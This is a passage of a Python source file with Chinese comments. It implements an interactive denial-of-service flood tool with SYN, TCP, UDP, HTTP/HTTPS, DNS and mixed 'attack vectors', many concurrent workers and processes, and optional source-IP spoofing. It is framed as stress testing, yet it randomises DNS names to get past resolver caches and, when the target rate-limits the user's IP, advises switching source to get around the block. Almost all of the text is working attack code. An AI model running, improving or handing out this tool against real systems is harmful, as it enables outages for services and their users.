                await w.drain()
            except (OSError, ssl.SSLError):
                return "write_err", 0
            stats.add(pkts=1, nbytes=len(req))
            if not wait_response:
                # 不等待时也必须定期排空, 否则接收窗口耗尽会卡死
                try:
                    data = await asyncio.wait_for(r.read(65536), timeout=0.05)
                    if data:
                        stats.add(rbytes=len(data))
                except (asyncio.TimeoutError, OSError, ssl.SSLError):
                    pass
                return "ok", 0
            deadline = now() + resp_timeout
            status, nbytes = await read_response(r, deadline)
            if nbytes:
                stats.add(rbytes=nbytes)
            return status, nbytes

        async def do_connect():
            """建立一条连接, 返回 (reader, writer, None) 或 (None, None, 错误类别)"""
            stats.add(attempts=1)
            if use_tls:
                async with hs_sem:
                    try:
                        r, w = await asyncio.wait_for(
                            asyncio.open_connection(
                                ip, port, ssl=ssl_ctx,
                                server_hostname=sni or target),
                            timeout=conn_timeout)
                        stats.add(tls_ok=1)
                        return r, w, None
                    except asyncio.TimeoutError:
                        stats.add(errs=1, tls_fail=1, kind="timeout")
                        return None, None, "timeout"
                    except (OSError, ssl.SSLError, ValueError) as e:
                        k = classify_err(e)
                        stats.add(errs=1, tls_fail=1, kind=k)
                        return None, None, k
            else:
                try:
                    r, w = await asyncio.wait_for(
                        asyncio.open_connection(ip, port), timeout=conn_timeout)
                    return r, w, None
                except asyncio.TimeoutError:
                    stats.add(errs=1, kind="timeout")
                    return None, None, "timeout"
                except OSError as e:
                    k = classify_err(e)
                    stats.add(errs=1, kind=k)
                    return None, None, k

        async def conn():
            while now() < end:
                # 每条连接固定 UA 与路径: 更贴近真实客户端(同一会话 UA 不变),
                # 也省掉每请求一次 random.choice 的全局锁竞争
                ua = random.choice(UA_POOL)
                path = random.choice(paths)
                r, w, kind = await do_connect()
                if r is None:
                    # fd/端口耗尽属于本地资源瓶颈, 重试只会空转烧 CPU,
                    # 必须拉长退避, 让已建立的连接把活干完
                    if kind in ("fd_exhausted", "port_exhausted"):
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                    else:
                        await asyncio.sleep(random.uniform(0.05, 0.3))
                    continue
                stats.add(conns=1)
                try:
                    while now() < end:
                        status, _nb = await one_request(r, w, ua, path)
                        # 状态异常 -> 关闭重连, 避免半读造成流错位
                        if status in ("timeout", "eof", "bad", "write_err"):
                            stats.add(errs=1, kind="resp_" + status)
                            break
                        if not reuse:
                            break
                        if reuse_jitter > 0:
                            await asyncio.sleep(random.uniform(0, reuse_jitter))
                except (OSError, ssl.SSLError, asyncio.IncompleteReadError) as e:
                    stats.add(errs=1, kind=classify_err(e))
                finally:
                    try:
                        w.close()
                    except Exception:
                        pass
                # 关键: 连接断了要重连, 不能让协程永久退出。
                # 否则长时间压测下 worker 会陆续死光, 后半段 pps 假性归零。
                # reuse=False 走的是"每请求一次建连"模式, 间隔要短才压得出
                # 真实建连速率; reuse=True 用较长间隔避免空转抢 CPU。
                await asyncio.sleep(random.uniform(0, 0.05 if reuse else 0.005))

        # 分批创建 Task: 50000 个协程一次性全堆进事件循环会造成启动瞬间的
        # 内存尖峰和调度拥堵, 分批拉起可以让前置连接先跑起来。
        tasks = []
        started = 0
        while started < workers and now() < end:
            n = min(SPAWN_STEP, workers - started)
            for _ in range(n):
                tasks.append(asyncio.create_task(conn()))
            started += n
            if started < workers:
                await asyncio.sleep(0.02)

        # 不再静默吞异常: 协程崩溃必须暴露到错误分类里,
        # 否则像 NameError 这种 bug 会藏在 gather 里跑完全程还显示 0 请求
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, asyncio.CancelledError):
                continue
            if isinstance(r, BaseException):
                stats.add(errs=1, kind="task_crash:%s" % type(r).__name__)

    # 关键: 绝对不能用 WindowsSelectorEventLoopPolicy。
    # Windows 的 select() 受 FD_SETSIZE=512 限制, 切到 Selector 等于把并发
    # 上限锁在 ~500 条连接, 超过就 ValueError: too many file descriptors。
    # 保持默认 Proactor(IOCP) 才能支撑上万并发。
    # Proactor 在对端 RST 时会往 connection_lost 里抛 ConnectionResetError,
    # 用自定义异常处理器静音即可, 不必更换事件循环。
    if IS_WIN:
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        except (AttributeError, DeprecationWarning):
            pass

    asyncio.run(main())


def dns_random_qname():
    """构造一个随机域名, 并返回 (wire 格式 qname, 可读字符串)。

    固定 qname 会被递归解析器和上游缓存命中, 测出来的是缓存性能而非
    解析能力; 每包换域名才能真正压到递归解析路径。
    """
    labels = random.randint(1, 3)
    parts = []
    alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
    for _ in range(labels):
        n = random.randint(4, 12)
        parts.append("".join(random.choice(alphabet) for _ in range(n)))
    parts.append(random.choice(("com", "net", "org", "cn", "io", "xyz")))
    name = ".".join(parts)
    wire = b""
    for lab in parts:
        b = lab.encode()
        wire += bytes((len(b),)) + b
    return wire + b"\x00", name


def build_dns_query():
    """构造一条随机 DNS 查询报文, 返回 (报文, 事务ID)"""
    qname, _ = dns_random_qname()
    tid = random.randint(1, 65535)
    qtype = random.choice((1, 1, 1, 28, 15, 16, 2))  # A 偏多, 兼顾 AAAA/MX/TXT/NS
    # QR=0 OPCODE=0 RD=1
    hdr = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    return hdr + qname + struct.pack("!HH", qtype, 1), tid


def vec_dns(target, port, duration, workers, size, spoof, stats,
            wait_response=True, randomize=True, drain_every=32):
    """DNS 查询洪水 — 随机 qname/qtype, 可选统计响应。

    randomize     : False 时退回固定 qname (仅用于对比缓存命中场景)
    wait_response : True 时读取响应并统计 rbytes/超时, 能反映解析失败
    drain_every   : 每发多少包排空一次响应队列。
                    调小(4~8)能更及时读回包, 响应率统计更准, 但吞吐略降;
                    调大可提高发包密度。默认 32。
    """
    stop = threading.Event()
    end = now() + duration
    fixed_q = b"\x0bstress-test\x07example\x03com\x00"

    def run():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
        except OSError:
            pass
        if wait_response:
            # 0.05s 对 RTT>50ms 的服务器会全部误判为无应答,
            # 放宽到 0.2s 同时兼顾高吞吐下的排空效率。
            s.settimeout(0.2)
        batch = max(1, int(drain_every))
        while not stop.is_set() and now() < end:
            try:
                for _ in range(batch):
                    if randomize:
                        pkt, tid = build_dns_query()
                    else:
                        # tid 同样要赋值: 两个分支保持一致,
                        # 避免以后有人在此之后引用 tid 时 NameError
                        tid = random.randint(1, 65535)
                        pkt = (struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0)
                               + fixed_q)
                    s.sendto(pkt, (target, port))
                stats.add(pkts=batch, nbytes=batch * len(pkt))
            except OSError as e:
                stats.add(errs=1, kind=classify_err(e))
                continue
            if wait_response:
                # 排空响应队列, 统计真实回包量
                got = 0
                while True:
                    try:
                        data = s.recv(4096)
                    except socket.timeout:
                        break
                    except OSError as e:
                        stats.add(errs=1, kind=classify_err(e))
                        break
                    if not data:
                        break
                    got += len(data)
                    if got > 512 * 1024:
                        break
                if got:
                    stats.add(rbytes=got)
                else:
                    stats.add(errs=1, kind="dns_no_reply")
        s.close()

    ts = [threading.Thread(target=run, daemon=True) for _ in range(workers)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()


# ============================================================
# 工作进程
# ============================================================
def worker(cfg, wid, q):
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    st = Stats()

    # ---- 周期上报: 避免中断时统计全丢 (旧版本只在结束时上报) ----
    stop_rep = threading.Event()

    def reporter():
        while not stop_rep.is_set():
            stop_rep.wait(0.5)
            if stop_rep.is_set():
                break
            try:
                q.put(("snap", wid, st.snapshot()))
            except Exception:
                pass

    rt = threading.Thread(target=reporter, daemon=True)
    rt.start()

    try:
        m = cfg["mode"]
        w = max(1, cfg["threads"] // cfg["procs"])
        if m == "syn":
            vec_syn(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                    cfg["spoof"], st)
        elif m == "udp":
            vec_udp(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                    cfg["spoof"], st)
        elif m == "tcp":
            vec_tcp(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                    cfg["spoof"], st)
        elif m in ("http", "https"):
            # SSLContext 不可 pickle, 在子进程内构建
            ctx = None
            if m == "https":
                ctx = build_ssl_context(
                    verify=cfg.get("tls_verify", False),
                    tls_version=cfg.get("tls_version", ""),
                    alpn=cfg.get("alpn"),
                    cipher=cfg.get("cipher", ""))
            vec_http(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                     cfg["spoof"], st, cfg["method"], cfg["paths"],
                     use_tls=(m == "https"), ssl_ctx=ctx,
                     host_header=cfg.get("host_header"),
                     sni=cfg.get("sni"), reuse=cfg.get("reuse", True),
                     cfg_hs_limit=cfg.get("hs_limit", 2000),
                     conn_timeout=cfg.get("conn_timeout", 8),
                     resp_timeout=float(cfg.get("resp_timeout", 5)),
                     wait_response=cfg.get("wait_response", True),
                     reuse_jitter=float(cfg.get("reuse_jitter", 0.01)))
        elif m == "dns":
            vec_dns(cfg["target"], cfg["port"], cfg["duration"], w, cfg["size"],
                    cfg["spoof"], st,
                    wait_response=cfg.get("dns_wait", True),
                    randomize=cfg.get("dns_random", True),
                    drain_every=cfg.get("dns_drain_every", 32))
        elif m == "mix":
            h = max(1, cfg["duration"] / 2)
            ts = [
                threading.Thread(target=vec_udp, args=(
                    cfg["target"], cfg["port"], h, max(1, w // 2), cfg["size"],
                    cfg["spoof"], st)),
                threading.Thread(target=vec_tcp, args=(
                    cfg["target"], cfg["port"], h, max(1, w // 2), cfg["size"],
                    cfg["spoof"], st)),
            ]
            for t in ts:
                t.start()
            for t in ts:
                t.join()
    except Exception as e:
        st.add(errs=1)
        try:
            q.put(("err", wid, repr(e)))
        except Exception:
            pass
    stop_rep.set()
    try:
        q.put(("final", wid, st.snapshot()))
    except Exception:
        pass


# ============================================================
# 交互式主流程
# ============================================================
def collect_config() -> dict:
    print(BANNER)
    print(hr("运行环境自检"))
    plat = "Windows" if IS_WIN else ("Linux" if IS_LINUX else
                                     ("macOS" if IS_MAC else sys.platform))
    print("  运行平台    : %s (%s)" % (plat, sys.platform))
    print("  Python 版本 : %s" % sys.version.split()[0])
    print("  CPU 核心数  : %s" % os.cpu_count())
    priv = "OK 是 (可用 SYN/UDP 原始包)" if is_root() else "X 否 (仅 TCP/HTTP/DNS)"
    if IS_WIN and not is_root():
        priv = "X 否 (请右键『以管理员身份运行』才能用原始套接字)"
    print("  特权状态    : %s" % priv)
    if IS_WIN:
        print("  控制台 ANSI : %s" % ("已开启" if USE_ANSI else "不支持 (进度行降级)"))
    try:
        if IS_WIN:
            ifs = []
            try:
                import subprocess
                out = subprocess.check_output(
                    ["netsh", "interface", "show", "interface"],
                    stderr=subprocess.DEVNULL, timeout=5)
                for line in out.decode("gbk", "ignore").splitlines()[3:]:
                    parts = line.split()
                    if len(parts) >= 5 and parts[0] in ("已启用", "已连接",
                                                        "Enabled", "Connected"):
                        ifs.append(parts[-1])
            except Exception:
                pass
            if ifs:
                print("  网络接口    : %s" % ", ".join(ifs[:6]))
        else:
            with open("/proc/net/dev") as f:
                ifaces = [l.split(":")[0].strip() for l in f.readlines()[2:]]
            print("  网络接口    : %s" % ", ".join(ifaces[:6]))
    except Exception:
        pass
    try:
        nf = fd_limit()
        if nf:
            print("  fd 上限     : %s" % format(nf, ","))
        elif IS_WIN:
            print("  fd 上限     : 不受 ulimit 限制 (Windows 句柄配额)")
    except Exception:
        pass
    print(hr())

    print("  [1] SYN 洪水   原始套接字, 灌满目标 SYN 队列形成半连接   [需 root]")
    print("  [2] TCP 洪水   并发 connect, 耗尽 accept 队列与 fd 表")
    print("  [3] UDP 洪水   大包/小包混合, 淹没带宽与报文队列")
    print("  [4] HTTP 洪水  应用层 GET/POST, keep-alive 长连接复用")
    print("  [5] HTTPS 洪水 TLS 加密层压测, 可锁 TLS1.2/1.3, 测握手与解密开销")
    print("  [6] DNS 洪水   DNS 解析服务器压测")
    print("  [7] 混合向量   UDP + TCP 同时打击")
    print(hr())

    modes = {"1": "syn", "2": "tcp", "3": "udp", "4": "http",
             "5": "https", "6": "dns", "7": "mix"}
    while True:
        c = ask("选择攻击向量", "1")
        if c in modes:
            mode = modes[c]
            break
        print("  ! 无效选项, 请输入 1-7")

    is_web = mode in ("http", "https")
    # ---- 目标解析: 支持 URL / host:port / host ----
    default_target = "https://example.com/" if mode == "https" else "127.0.0.1"
    raw_target = ask("目标 (支持 https://host:port/path)", default_target)
    host, url_port, scheme, url_paths = parse_target(raw_target)

    if mode == "https":
        use_tls = True
    elif mode == "http" and scheme == "https":
        # 用户在 http 模式里写了 https:// -> 自动升级为 TLS
        use_tls = True
    else:
        use_tls = False

    if mode == "https" and scheme != "https":
        scheme = "https"
    if mode == "http" and scheme == "https":
        mode = "https"

    if url_port:
        port = url_port
    else:
        port = ask_int("目标端口", 443 if use_tls else (53 if mode == "dns" else 80))

    print(hr("强度档位"))
    for k in sorted(PROFILES):
        name, conn, thr, size = PROFILES[k]
        print("  [%s] %-8s %s" % (k, name, PROF_DESC[name]))
    pk = ask("选择档位", "2")
    if pk not in PROFILES:
        pk = "2"
    pname, conn, thr, size = PROFILES[pk]

    duration = ask_int("持续时间 (秒)", 60)
    procs = ask_int("工作进程数", max(2, os.cpu_count() or 4))
    size = ask_int("包/负载大小 (字节)", size)
    threads = ask_int("并发数 (覆盖档位默认值)", conn)

    # ---- fd 上限: 先尝试自动提到硬上限, 再校验并发是否可行 ----
    nf = fd_limit()
    if nf and try_raise_fd():
        new_nf = fd_limit()
        print("  [*] fd 软上限已自动提升: %s -> %s"
              % (format(nf, ","), format(new_nf, ",")))
        nf = new_nf
    if nf:
        # 每个 worker 进程独立持有 fd, 所以总容量 = 单进程上限 * 进程数
        per_proc_ok = max(16, nf - 64)
        cap = per_proc_ok * procs
        if threads > cap:
            print("  [!] 并发 %d 超出本机 fd 承载能力" % threads)
            print("      单个进程 fd 上限 %s，%d 个进程 => 实际最多约 %s 并发"
                  % (format(nf, ","), procs, format(cap, ",")))
            print("      超出部分会全部 EMFILE 失败，白白占满 CPU。")
            print("      解决: ulimit -n 1048576  或  并发降到 %s 以内"
                  % format(cap, ","))
            newt = ask_int("调整并发数 (0=不改, 直接回车=%d)" % cap, cap,
                           allow_zero=True)
            if newt == 0:
                print("  [*] 保持原并发 %d (可能大量 EMFILE)" % threads)
            else:
                threads = newt
    spoof = False

    method, paths = "GET", url_paths or ["/"]
    if is_web:
        method = ask("HTTP 方法 (GET/POST)", "GET").upper()
        if method not in ("GET", "POST", "PUT", "HEAD"):
            method = "GET"
        p = ask("请求路径 (逗号分隔)", ",".join(paths))
        paths = [x.strip() for x in p.split(",") if x.strip()] or ["/"]
        if method in ("POST", "PUT"):
            size = ask_int("请求体大小 (字节)", 1024)
        else:
            size = 0

    # ---- TLS 参数 ----
    tls_verify = False
    tls_version = ""
    alpn = None
    cipher = ""
    sni = None
    host_header = None
    reuse = True
    if use_tls:
        print(hr("TLS 配置"))
        tls_verify = ask_yn("校验服务器证书? (Y=严格校验, N=跳过(自签/过期也能压))", False)
        tv = ask("TLS 版本 (1.2 / 1.3 / auto)", "auto").strip()
        if tv in ("1.2", "1.3"):
            tls_version = tv
        a = ask("ALPN 协议 (逗号分隔, 留空=不发送)", "").strip()
        if a:
            alpn = [x.strip() for x in a.split(",") if x.strip()]
        sni = ask("SNI 主机名 (留空=同目标主机名)", host).strip() or host
        hh = ask("Host 头覆盖 (留空=同目标主机名)", "").strip()
        if hh:
            host_header = hh
        cph = ask("Cipher 套件 (留空=默认)", "").strip()
        if cph:
            cipher = cph
        reuse = ask_yn("复用 TLS 连接? (Y=长连接省握手, N=每请求重连压握手CPU)", True)
        hs_limit = ask_int("同时握手数上限 (过高会打满本机CPU)", min(threads, 2000))
    else:
        hs_limit = min(threads, 2000)

    # 建连超时: 值越小越早回收槽位, 但网络抖动会误判
    resp_timeout = 5
    wait_response = True
    if is_web:
        conn_timeout = ask_int("建连/握手超时 (秒, 越小失败回收越快)", 8)
        wait_response = ask_yn(
            "等待完整响应? (Y=数据可信但速率受RTT限制, N=发射后不管纯压带宽)", True)
        if wait_response:
            resp_timeout = ask_int("单条响应超时 (秒, 超时即判定目标变慢并重连)", 5)
    else:
        conn_timeout = 8

    dns_wait = True
    dns_random = True
    if mode == "dns":
        print(hr("DNS 选项"))
        dns_random = ask_yn(
            "随机化查询域名? (Y=每包不同域名, 能压到递归解析; N=固定域名只测缓存)", True)
        dns_wait = ask_yn(
            "读取响应? (Y=统计回包与无响应数, 反映真实解析成败)", True)
        if dns_wait:
            print("  [i] 高吞吐下响应统计可能偏低 (排空窗口有限), "
                  "判读时以「发出 pps」和「收到数据」为准")
        if not dns_random:
            print("  [!] 固定域名会被缓存命中, 测出的不是递归解析能力")
        if dns_wait:
            dns_drain_every = ask_int(
                "每批发多少包排空一次响应 (4-8 响应率更准, 32 吞吐更高)", 32)
        else:
            dns_drain_every = 32
    else:
        dns_drain_every = 32

    if mode in ("syn", "udp"):
        spoof = ask_yn("源 IP 地址伪造? (仅限授权靶场 / 内网)", False)

    cfg = dict(mode=mode, target=host, port=port, duration=duration,
               procs=procs, size=size, threads=threads, spoof=spoof,
               method=method, paths=paths, profile=pname,
               use_tls=use_tls, tls_verify=tls_verify, tls_version=tls_version,
               alpn=alpn, cipher=cipher, sni=sni, host_header=host_header,
               reuse=reuse, hs_limit=hs_limit, conn_timeout=conn_timeout,
               resp_timeout=resp_timeout, wait_response=wait_response,
               dns_wait=dns_wait, dns_random=dns_random,
               dns_drain_every=dns_drain_every)

    print(hr("配置确认"))
    print("  目标      : %s://%s:%d" % ("https" if use_tls else "http", host, port))
    print("  向量      : %s" % mode.upper())
    print("  档位      : %s   并发 %d   进程 %d" % (pname, threads, procs))
    print("  时长      : %d 秒" % duration)
    print("  负载      : %d 字节    伪造源 IP: %s" % (size, "是" if spoof else "否"))
    if use_tls:
        print("  TLS       : 校验=%s  版本=%s  SNI=%s  ALPN=%s  复用=%s"
              % ("开" if tls_verify else "关",
                 tls_version or "auto", sni,
                 ",".join(alpn) if alpn else "无", "是" if reuse else "否"))
        print("  握手并发  : %d" % hs_limit)
    if is_web:
        print("  响应策略  : %s"
              % ("等待完整响应 (超时 %ds)" % resp_timeout if wait_response
                 else "发射后不管 (仅周期性排空, 速率不受RTT限制)"))
    if is_web:
        print("  建连超时  : %d 秒" % conn_timeout)
    if mode == "dns":
        print("  查询域名  : %s" % ("每包随机 (压递归解析)" if dns_random
                                    else "固定 example.com (仅测缓存)"))
        print("  读取响应  : %s" % ("是" if dns_wait else "否 (只看发出量)"))
    print("  路径      : %s" % ", ".join(paths))
    print("  本机出口  : %s" % local_ip())
    print(hr())

    # ---- 连通性预检 ----
    if mode == "dns":
        print(hr("连通性预检 (UDP)"))
        ok, msg = preflight_udp(host, port)
        print("  预检结果  : %s" % ("通过 - " + msg if ok else "失败 - " + msg))
        if not ok:
            print("  [!] 目标 UDP 端口不可达, 继续压测大概率全失败。")
            if not ask_yn("仍要继续?", False):
                print("已取消。")
                sys.exit(0)
        print(hr())
    elif is_web:
        print(hr("连通性预检"))
        ctx = None
        if use_tls:
            try:
                ctx = build_ssl_context(tls_verify, tls_version, alpn, cipher)
            except Exception as e:
                print("  ! TLS 上下文构建失败: %s" % e)
        ok, msg = preflight(host, port, use_tls, ctx, sni)
        print("  预检结果  : %s" % ("通过 - " + msg if ok else "失败 - " + msg))
        if not ok:
            print("  [!] 目标不可达, 继续压测大概率全失败。")
            if not ask_yn("仍要继续?", False):
                print("已取消。")
                sys.exit(0)
        print(hr())

    if not ask_yn("确认开始测试?", True):
        print("已取消。")
        sys.exit(0)
    return cfg


def run(cfg):
    print("\n[*] 启动 %d 个工作进程 ...\n" % cfg["procs"])
    q: Queue = Queue()
    procs = []
    for i in range(cfg["procs"]):
        p = Process(target=worker, args=(cfg, i, q))
        p.start()
        procs.append(p)

    agg = {"p": 0, "b": 0, "rb": 0, "e": 0, "c": 0, "at": 0, "tk": 0, "tf": 0}
    latest = {}          # wid -> 累计快照 (每个 worker 的最新值)
    worker_errors = {}   # wid -> 异常信息
    kinds = {}           # 错误分类聚合
    lp, lb = 0, 0
    last_rx, last_rx_t = iface_rx_bytes(), now()
    t0 = now()
    stop = threading.Event()

    def collector():
        """快照是每个 worker 的累计值, 因此按 wid 取最新再求和"""
        while not stop.is_set():
            try:
                while True:
                    msg = q.get_nowait()
                    kind = msg[0]
                    if kind in ("snap", "final"):
                        latest[msg[1]] = msg[2]
                    elif kind == "err":
                        worker_errors[msg[1]] = msg[2]
            except Exception:
                pass
            # 汇总
            for k in agg:
                agg[k] = 0
            kinds.clear()
            for snap in latest.values():
                agg["p"] += snap[0]
                agg["b"] += snap[1]
                agg["rb"] += snap[2]
                agg["e"] += snap[3]
                agg["c"] += snap[4]
                agg["at"] += snap[5]
                agg["tk"] += snap[6]
                agg["tf"] += snap[7]
                if len(snap) > 8 and isinstance(snap[8], dict):
                    for kk, vv in snap[8].items():
                        kinds[kk] = kinds.get(kk, 0) + vv
            time.sleep(0.2)

    threading.Thread(target=collector, daemon=True).start()

    tls_mode = cfg.get("use_tls", False)
    # 收尾缓冲: 必须覆盖"最后一条请求还在等响应"的时间。
    # 只有 web 模式才需要等响应, 其他向量发完即结束, 固定 2 秒足够。
    # 按模式区分可以省掉无谓的等待 (resp_timeout 默认 5 时能省 4 秒)。
    if cfg.get("mode") in ("http", "https"):
        tail = max(2, int(cfg.get("resp_timeout", 2) or 2) + 1)
    else:
        tail = 2
    try:
        while now() - t0 < cfg["duration"] + tail:
            time.sleep(1)
            el = now() - t0
            pps = agg["p"] - lp
            db = agg["b"] - lb
            lp, lb = agg["p"], agg["b"]
            mbps = db * 8 / 1e6

            rx = iface_rx_bytes()
            # 注意: 不能叫 now, 否则会遮蔽模块级 now() 函数,
            # 导致整个 run() 里 now 变成局部变量 -> UnboundLocalError
            now_t = now()
            # Windows 的 GetIfTable 计数器是 32 位, 会在 4GiB 处回绕
            rxb = rx_delta(rx, last_rx) * 8 / 1e6 / max(0.001, now_t - last_rx_t)
            last_rx, last_rx_t = rx, now_t

            if tls_mode:
                hs_total = agg["tk"] + agg["tf"]
                hsr = (agg["tk"] * 100.0 / hs_total) if hs_total else 0.0
                extra = " | 握手 %8s 失败 %7s (%5.1f%%成功)" % (
                    format(agg["tk"], ","), format(agg["tf"], ","), hsr)
            else:
                extra = " | 尝试 %9s" % format(agg["at"], ",")
            print(clear_line_prefix()
                  + "  [%5.1fs] %-5s pps %9s | 发出 %7.2f Mbps | 回收 %6.2f Mbps "
                  "| 请求 %11s | %6.3f GB | 连接 %8s | 错误 %7s%s"
                  % (el, cfg["mode"].upper(), format(pps, ","), mbps, rxb,
                     format(agg["p"], ","), agg["b"] / 1e9,
                     format(agg["c"], ","), format(agg["e"], ","), extra), end="")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n\n[!] 收到中断, 正在停止所有工作进程 ...")
    finally:
        stop.set()
        for p in procs:
            if p.is_alive():
                p.terminate()
        for p in procs:
            p.join(timeout=2)
        el = max(0.001, now() - t0)
        # 平均速率只用"实际测量窗口"作分母: 收尾缓冲期间 worker 已在退出,
        # 那段空转不该计入, 否则会把平均值稀释。
        meas = max(0.001, min(el, float(cfg["duration"])))
        alive = sum(1 for p in procs if p.is_alive())
        print("\n\n" + hr("测试报告"))
        print("  目标        : %s://%s:%d  [%s]"
              % ("https" if cfg.get("use_tls") else "http",
                 cfg["target"], cfg["port"], cfg["mode"].upper()))
        print("  总发包      : %s" % format(agg["p"], ","))
        print("  总流量      : %.3f GB  (%.2f Gbit)" % (agg["b"] / 1e9, agg["b"] * 8 / 1e9))
        print("  收到数据    : %.3f GB" % (agg["rb"] / 1e9))
        print("  建连尝试    : %s" % format(agg["at"], ","))
        # "成功连接"在不同向量/模式下语义不同, 标注清楚避免误读
        mode_now = cfg.get("mode")
        if mode_now in ("http", "https"):
            if cfg.get("reuse", True):
                conn_label = "长连接数 (连接复用, 每条承载多个请求)"
            else:
                conn_label = "建连次数 (每请求新建连接)"
        elif mode_now == "tcp":
            conn_label = "建连次数"
        elif mode_now == "mix":
            # mix = UDP + TCP 并行, TCP 部分会真实建连, 不能标成"恒为 0"
            conn_label = "TCP 建连次数 (混合向量中的 TCP 部分)"
        else:
            conn_label = "TCP 建连 (本向量不走连接, 恒为 0)"
        print("  成功连接    : %s   %s" % (format(agg["c"], ","), conn_label))
        print("  错误/超时   : %s" % format(agg["e"], ","))
        if tls_mode:
            print("  TLS 握手成功: %s" % format(agg["tk"], ","))
            print("  TLS 握手失败: %s" % format(agg["tf"], ","))
            if agg["tk"] + agg["tf"] > 0:
                print("  握手成功率  : %.2f%%" % (agg["tk"] * 100.0 / (agg["tk"] + agg["tf"])))
        print("  平均速率    : %s pps  |  %.2f Mbps   (按 %.0fs 测量窗口)"
              % (format(int(agg["p"] / meas), ","), agg["b"] * 8 / meas / 1e6,
                 meas))
        print("  上报进程    : %d/%d  (存活的 %d)"
              % (len(latest), len(procs), alive))

        # ---- 错误分类: 关键诊断 ----
        if kinds:
            print(hr("错误分类"))
            label = {
                "fd_exhausted":   "本地 fd 耗尽 (EMFILE)",
                "port_exhausted": "本地临时端口耗尽",
                "reset":          "连接被重置 (RST)",
                "refused":        "连接被拒绝 (端口不通/服务下线)",
                "timeout":        "建连/握手超时",
                "tls":            "TLS 层错误",
                "dns":            "DNS 解析失败",
                "resp_timeout":   "响应超时 (目标变慢/限流)",
                "resp_eof":       "响应未完成即被关闭",
                "resp_bad":       "响应格式异常",
                "resp_write_err": "发送失败",
                "dns_no_reply":   "DNS 查询无应答",
                "other":          "其他",
            }
            for k, v in sorted(kinds.items(), key=lambda x: -x[1])[:8]:
                if k.startswith("os_err_"):
                    nm = "系统错误 errno=%s" % k.split("_")[-1]
                else:
                    nm = label.get(k, k)
                print("  %-32s %12s  (%5.1f%%)"
                      % (nm, format(v, ","), v * 100.0 / max(1, agg["e"])))

        # ---- 根因诊断 ----
        fde = kinds.get("fd_exhausted", 0)
        pte = kinds.get("port_exhausted", 0)
        tmo = kinds.get("timeout", 0)
        crash = sum(v for k, v in kinds.items() if k.startswith("task_crash"))
        diag = []
        if crash > 0:
            diag.append("协程崩溃 %s 次 (%s): 工具内部 bug, 请把该行报给开发者"
                        % (format(crash, ","),
                           ", ".join("%s=%d" % (k.split(":")[-1], v)
                                     for k, v in kinds.items()
                                     if k.startswith("task_crash"))))
        if fde > 0:
            diag.append("fd 上限不足: 有 %s 次 EMFILE, 请 ulimit -n 1048576 后重测"
                        % format(fde, ","))
        if pte > 0:
            diag.append("临时端口耗尽: 加长连接复用或缩短 TIME_WAIT, 或降低并发")
        if agg["at"] > 0 and agg["c"] == 0:
            diag.append("零成功连接: 先跑 light 档确认链路通")
        if agg["tk"] > 0 and agg["p"] == 0:
            diag.append("握手成功 %s 次但零请求: 疑似工具 bug 或目标握手后立即断连"
                        % format(agg["tk"], ","))
        if tmo > 0 and agg["e"] > 0 and tmo * 100.0 / agg["e"] >= 50:
            diag.append("超时占 %.0f%%: 目标很可能已对本机 IP 限流/黑洞丢包, "
                        "建议换源或降并发并拉长间隔"
                        % (tmo * 100.0 / agg["e"]))
        if agg["e"] > agg["c"] * 10 and agg["c"] > 0 and crash == 0 and fde == 0:
            diag.append("失败率极高 (%.1f%%): 主要瓶颈在本机而非目标"
                        % (agg["e"] * 100.0 / max(1, agg["at"])))

        # ---- DNS 专项: 无应答是软信号, 不当硬失败 ----
        nrep = kinds.get("dns_no_reply", 0)
        if nrep > 0:
            diag.append("DNS 无应答 %s 次: 属软信号, 不一定是失败 — "
                        "若「收到数据」不为 0 说明服务器在正常回包, "
                        "只是本机排空窗口内没读到 (RTT 偏高或洪峰丢弃)"
                        % format(nrep, ","))
            if agg["rb"] > 0 and agg["e"] > 0 and nrep * 100.0 / agg["e"] >= 80:
                diag.append("  参考: 本次已收到 %.3f GB 响应, 服务器工作正常, "
                            "以「发出 pps」和「收到数据」为准判读" % (agg["rb"] / 1e9))

        if diag:
            print(hr("根因诊断"))
            for d in diag:
                print("  - %s" % d)

        if worker_errors:
            for wid, msg in worker_errors.items():
                print("  [!] 进程 %d 异常: %s" % (wid, msg))
        print(hr())
        print("  提醒: 请确认目标服务已恢复, 及时清理服务端连接与日志。")


def main():
    setup_console()
    while True:
        cfg = collect_config()
        run(cfg)
        print()
        if not ask_yn("再跑一轮?", False):
            print("Bye.")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] 退出")
